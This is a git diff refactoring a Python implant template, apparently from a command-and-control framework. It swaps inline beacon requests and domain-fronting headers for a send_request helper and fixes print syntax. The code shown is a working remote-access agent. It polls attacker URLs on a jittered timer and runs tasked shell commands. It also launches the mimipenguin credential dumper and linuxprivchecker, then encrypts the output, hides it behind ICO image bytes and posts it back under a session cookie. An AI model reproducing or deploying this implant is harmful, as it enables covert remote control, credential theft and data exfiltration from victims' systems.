@@ -10,12 +10,9 @@ def parse_sleep_time(sleep):
   elif sleep.endswith('h'):
     return int(sleep.strip('h').strip()) * 60 * 60
 
-hh[0] = [%s]
 timer = parse_sleep_time("%s".strip())
 icoimage = [%s]
 urls = [%s]
-kd=time.strptime("%s","%%Y-%%m-%%d")
-useragent = ""
 imbase = "%s"
 jitter = %s
 
@@ -101,23 +98,18 @@ def python_prep_module(command):
   args.pop(pycode_index)
   pycode = base64.b64decode(encoded_module)
   pycode = 'import sys; sys.argv = sys.argv[1:];' + pycode
-  print "prepmodule gtg"
+  print("prepmodule gtg")
   return (pycode,args)
 
 while(True):
   cstr=time.strftime("%%Y-%%m-%%d",time.gmtime());cstr=time.strptime(cstr,"%%Y-%%m-%%d")
-  if cstr < kd:
+  if cstr < killdate:
     key = "%s"
     uri = "%s"
-    server = "%%s/%%s%%s" %% (serverclean[0], random.choice(urls), uri)
     try:
       this_timer = random.randint(timer * (1 - jitter), timer * (1 + jitter))
       time.sleep(this_timer)
-      ua='%s'
-      if hh[0]: req=urllib2.Request(server,headers={'Host':hh[0],'User-agent':ua})
-      else: req=urllib2.Request(server,headers={'User-agent':ua})
-      res=urllib2.urlopen(req)
-      html = res.read().decode("utf-8")
+      html = send_request(("%%s%%s" % random.choice(urls), uri))
     except Exception as e:
       print("error %%s" %% e)
     if html:
@@ -177,25 +169,17 @@ while(True):
                 else:
                   returnval = "Module loaded"
               except Exception as e:
-                returnval = "Error with source file: %%s" %% e              
+                returnval = "Error with source file: %%s" %% e
             elif cmd.startswith("linuxprivchecker"):
               command,args = python_prep_module(cmd)
-              print "elif lpc running"
               import subprocess
               returnval = subprocess.check_output(['python2', '-c', command] + args)
 
             elif cmd.startswith("mimipenguin"):
               command,args = python_prep_module(cmd)
-              print "elif mimip"
-              print command
-              print args
               import subprocess
-<<<<<<< HEAD
-              returnval = subprocess.check_output(['python', '-c', pycode] + args)
-=======
               returnval = subprocess.check_output(['python3', '-c', command] + args)
 
->>>>>>> add python preloader
             elif cmd[:6] == "python":
               module = cmd.replace("python ","")
               try:
@@ -225,7 +209,6 @@ while(True):
                 returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
               except subprocess.CalledProcessError as exc:
                 returnval = "ErrorCmd: %%s" %% exc.output
-            server = "%%s/%%s%%s" %% (serverclean[0], random.choice(urls), uri)
             postcookie = encrypt(key, taskId).decode("utf-8")
             data = base64.b64decode(random.choice(icoimage))
 
@@ -235,11 +218,7 @@ while(True):
                 dataimage = data.ljust(1500, bytes('\x00', "utf-8"))
             enc=encrypt(key, returnval, gzipfile=True)
             dataimagebytes = dataimage+enc
-            if hh[0]: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh[0],'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            
-            res=urllib2.urlopen(req)
-            response = res.read()
+            response = send_request(("%%s%%s" % random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : f"SessionID={postcookie}"})
 
       except Exception as e:
         print(e)
